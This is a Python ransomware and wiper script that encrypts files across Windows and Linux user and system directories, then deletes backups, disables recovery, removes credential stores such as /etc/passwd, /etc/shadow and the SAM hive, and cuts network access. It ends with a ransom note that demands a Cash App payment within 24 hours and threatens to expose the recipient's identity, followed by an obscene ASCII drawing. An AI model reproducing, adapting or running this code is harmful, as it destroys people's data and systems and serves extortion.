#!/usr/bin/env python3

import os
import shutil
import subprocess
from cryptography.fernet import Fernet
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed

# Function to find all files in a directory
def find_files(directory):
    files = []
    for root, dirs, file_list in os.walk(directory):
        for file_name in file_list:
            if file_name in ["main.py", "thekey.key", "decrypt.py"]:
                continue
            files.append(os.path.join(root, file_name))
    return files

# Function to get targeted directories for encryption
def get_target_directories():
    if platform.system() == "Windows":
        user_dir = os.getenv("USERPROFILE")
        return [
            user_dir,
            os.path.join(user_dir, "Documents"),
            os.path.join(user_dir, "Pictures"),
            os.path.join(user_dir, "Videos"),
            os.path.join(user_dir, "Music"),
            os.path.join(user_dir, "Desktop"),
            os.path.join(user_dir, "Downloads"),
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\Users",
            "C:\\Windows\\System32",
            "C:\\Windows\\SysWOW64",
            "C:\\Windows\\WinSxS"
        ]
    else:
        return [
            "/home",
            "/root",
            "/etc",
            "/var",
            "/usr",
            "/usr/local",
            "/srv",
            "/opt",
            "/lib",
            "/lib64",
            "/bin",
            "/sbin",
            "/tmp"
        ]

# Adjust permissions for a file
def adjust_permissions(file):
    if platform.system() == "Windows":
        # Windows specific command to grant full control to all users
        subprocess.run(["icacls", file, "/grant", "Everyone:F"], check=True)
    else:
        # Linux specific command to set full read, write, execute permissions for all users
        subprocess.run(["chmod", "777", file], check=True)

# Function to process files in chunks
def process_files_in_chunks(files, chunk_size, function):
    for i in range(0, len(files), chunk_size):
        chunk = files[i:i + chunk_size]
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(function, file) for file in chunk]
            for future in as_completed(futures):
                future.result()  # Wait for all futures to complete

# Finding all files starting from targeted directories
files = []
for target_dir in get_target_directories():
    files.extend(find_files(target_dir))

print("Files to be encrypted:", len(files))

# Generating a key
key = Fernet.generate_key()

# Saving the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Function to encrypt a single file
def encrypt_file(file):
    try:
        adjust_permissions(file)  # Adjust permissions before accessing the file
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted {file}")
    except Exception as e:
        print(f"Skipping file {file} due to {e}")

# Encrypt files in chunks
process_files_in_chunks(files, 100, encrypt_file)

print("Encryption process completed.")

# Remove system backups and disable recovery options (DANGEROUS)
def remove_backups():
    backup_paths = {
        "Linux": ["/var/backups", "/mnt/backup", "/etc/backups"],
        "Windows": [os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Backups"),
                    os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Local\\Microsoft\\Windows\\Libraries\\Backups")]
    }
    paths = backup_paths.get(platform.system(), [])
    for path in paths:
        try:
            shutil.rmtree(path)
            print(f"Removed backup at {path}")
        except Exception as e:
            print(f"Could not remove backup at {path} due to {e}")

def disable_recovery():
    if platform.system() == "Windows":
        try:
            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], check=True)
            print("Disabled Windows recovery")
        except Exception as e:
            print(f"Could not disable Windows recovery due to {e}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(["systemctl", "disable", "--now", "recovery"], check=True)
            print("Disabled Linux recovery")
        except Exception as e:
            print(f"Could not disable Linux recovery due to {e}")

# Delete important system files (DANGEROUS)
def delete_important_files():
    important_files = {
        "Linux": ["/etc/passwd", "/etc/shadow"],
        "Windows": [os.path.join(os.getenv("SystemRoot"), "System32\\config\\SAM"),
                    os.path.join(os.getenv("SystemRoot"), "System32\\config\\SYSTEM")]
    }
    files = important_files.get(platform.system(), [])
    for file in files:
        try:
            adjust_permissions(file)  # Adjust permissions before deleting
            os.remove(file)
            print(f"Deleted {file}")
        except Exception as e:
            print(f"Could not delete {file} due to {e}")

# Disable network interfaces (DANGEROUS)
def disable_network():
    if platform.system() == "Windows":
        try:
            subprocess.run(["netsh", "interface", "set", "interface", "Ethernet", "admin=disable"], check=True)
            print("Disabled network interface on Windows")
        except Exception as e:
            print(f"Could not disable network interfaces on Windows due to {e}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(["nmcli", "networking", "off"], check=True)
            print("Disabled network interfaces on Linux")
        except Exception as e:
            print(f"Could not disable network interfaces on Linux due to {e}")

# Execute catastrophic actions in chunks to avoid memory issues
process_files_in_chunks(files, 100, encrypt_file)
remove_backups()
disable_recovery()
delete_important_files()
disable_network()

print("Catastrophic actions completed.")




print("Didnt your mom ever tell you to not scam innocent people?")
print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
print("You are smart but I am smarter")
print("if you fail to do so I will hand everything over to the FBI including your real identity and location which will then be given to the proper authorities to reach you.")
print("you have 24 hours to respond")
print("you will respond via the same email thread you sent the counterfit check")
print("failure to respond as instructed will result in total system termination")
bird = """

░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
░░░░░░░░░░░░░░█░░█░░░░░░░░░░
██████▄███▄████░░███▄░░░░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
█████▀░░░░▀▀████████░░░░░░


"""
print(bird)